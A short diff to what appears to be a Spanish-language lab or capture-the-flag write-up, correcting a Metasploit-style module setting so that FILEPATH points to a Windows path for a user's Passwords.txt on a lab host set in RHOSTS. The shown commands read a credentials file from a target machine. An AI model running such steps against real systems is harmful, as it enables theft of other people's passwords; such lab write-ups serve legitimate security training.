@@ -138,7 +138,7 @@ la nota, apuntamos `FILEPATH` al fichero de contraseñas de Nathan:
 
 ```
 set RHOSTS 10.129.227.77
-set FILEPATH /Users/Nathan/Desktop/Passwords.txt
+set FILEPATH C:\Users\Nathan\Desktop\Passwords.txt
 run
 ```
 
